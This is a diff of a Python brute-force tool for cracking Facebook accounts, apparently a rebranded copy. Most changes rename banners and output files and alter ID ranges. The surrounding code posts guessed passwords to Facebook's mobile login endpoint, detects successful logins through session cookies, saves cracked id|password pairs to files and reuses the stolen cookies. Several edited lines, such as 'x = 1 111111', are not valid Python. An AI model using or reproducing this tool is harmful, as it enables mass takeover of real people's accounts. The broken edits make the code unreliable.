@@ -316,17 +316,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;93m [MRD-OK ] {idf} | {pw}')
+				print( f'\r\x1b[1;93m [ZEE-OK ] {idf} | {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [XD-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ZEE-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/XD-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/ZEE1-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -364,7 +364,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [MRD-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/MRD-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/zee-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -393,12 +393,12 @@ logo = """
 \033[95m   $$/ $$/       $$/  $$$$$$$/ $$/   $$/  $$$$$$$/ $$/       
                                                              
                                                              
-\033[1;91m Tricker 313🤪 Mafyia313
+\033[1;91m Zee Sial
 \033[0;95m═══════════════════════════════════════════
-\033[0;94m [!]\033[0;91mTOOL OWER :\033[0;92mTricker❤️313     
-\033[0;94m [!]\033[0;91mTOOL NAME :\033[0;92m Mlti Cracker
-\033[0;94m [!]\033[0;91mVERSION   :\033[0;92m3.0.7
-\033[0;94m [!]\033[0;94mTricker🤪
+\033[0;94m [!]\033[0;91mTOOL OWER :\033[0;92mZee Sial     
+\033[0;94m [!]\033[0;91mTOOL NAME :\033[0;92m Test File
+\033[0;94m [!]\033[0;91mVERSION   :\033[0;92m0.0.1
+\033[0;94m [!]\033[0;94mZee Sial🤪
 \033[0;95m═══════════════════════════════════════════"""
  
 class Main:
@@ -439,8 +439,8 @@ class Main:
 		print(" \033[0;94m[1]\033[0;97m Crack with File Unlimtd\033[0;92m ~[No login]")
 		print(" \033[0;93m[2] Crack from Public Id    ~[>< login]")
 		print(" [3] Cloning Pak Idz         ~[No login] ")
-		print(" \033[0;94m[4] Cloning Old Idz 2008-10 \033[0;94m~[No login]")
-		print(" [5] Cloning Old Idz 2011-16\033[0;94m ~[No login]")
+		print(" \033[0;94m[4] Cloning Old Idz 030 \033[0;94m~[No login]")
+		print(" [5] Cloning Old Idz 031\033[0;94m ~[No login]")
 		print("\033[0;91m [E] Exit \n")
 		UZAIR =input(" \033[0;93mChoose : ")
 		if UZAIR in ["1", "01"]:
@@ -448,7 +448,7 @@ class Main:
 		if UZAIR in ["2", "02"]:
 			Public()
 		if UZAIR in ["3", "03"]:
-			os.system("python2 mrd1.py")
+			os.system("python mrd1.py")
 		if UZAIR in ["4", "04"]:
 			self.old()
 		if UZAIR in ["5", "05"]:
@@ -460,9 +460,9 @@ class Main:
 			Main()
  
 	def old(self):
-		x = 111111111
-		xx = 999999999
-		idx = "100000" 
+		x = 1 111111
+		xx = 5 999999
+		idx = "030" 
 		os.system('clear');print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -481,7 +481,7 @@ class Main:
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   FREE MODE ACTIVATE")
-				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
+				print("\n\033[0;94m [+] Zee Sial")
 				print(" \033[0;96m[+] Note: Cp Ac Open 70% JUST NOW")
 				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
 				print("\033[0;94m----------------------------------------------")
@@ -891,9 +891,9 @@ class Main:
 		self.loop +=1
  
 	def old2(self):
-		x = 1111111111
-		xx = 9999999999
-		idx = "10000" 
+		x = 1 1111111
+		xx = 5 9999999
+		idx = "031" 
 		os.system('clear');print(logo)
 		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
